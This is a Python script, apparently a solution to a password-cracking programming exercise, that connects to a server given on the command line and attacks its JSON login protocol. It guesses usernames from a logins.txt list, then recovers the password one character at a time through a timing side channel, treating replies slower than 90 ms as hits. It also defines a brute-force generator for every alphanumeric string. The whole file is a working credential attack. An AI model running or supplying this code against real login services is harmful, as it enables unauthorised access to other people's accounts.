import socket
import sys
import itertools
import string
import json
from datetime import datetime


def getting_inputs():
    args = sys.argv
    host = args[1]
    port = int(args[2])
    return host, port


def read_file(path):
    with open(path, "r", encoding="utf-8") as f:
        pass_list = f.read().splitlines()  # splitline() will remove the "\n" at the end of each line
    return pass_list


def brute_force():
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    # for mixing characters
    for i in range(1, len(characters) + 1):
        for password in itertools.product(characters, repeat=i):
            yield "".join(password)


def to_json(login_name, login_pass=" "):
    login_d = {}
    login_d["login"] = login_name
    login_d["password"] = login_pass
    return json.dumps(login_d)


def decode_json(json_str):
    return json.loads(json_str)


def creating_sock(host, port):
    with socket.socket() as my_sock:
        my_sock.connect((host, port))
        login_file = "logins.txt"
        login_list = read_file(login_file)
        for name in login_list:
            data = to_json(name.strip()).encode()
            my_sock.send(data)
            response = my_sock.recv(1024)
            response = json.loads(response.decode())["result"]
            if response == "Wrong login!":
                pass
            elif response == "Wrong password!":
                user_name = name.strip()
        characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
        pass_word = ""
        while True:
            for char in characters:
                password = pass_word + char
                data = to_json(user_name, password).encode()
                start = datetime.now()
                my_sock.send(data)
                response = my_sock.recv(1024)
                finish = datetime.now()
                response = json.loads(response.decode())["result"]
                diff = finish.microsecond - start.microsecond
                if response == "Connection success!":
                    return to_json(user_name, password)
                elif response == "Wrong password!":
                    if diff > 90000:
                        pass_word += char
                        break
                else:
                    pass
 


def run():
    host, port = getting_inputs()
    print(creating_sock(host, port))


run()
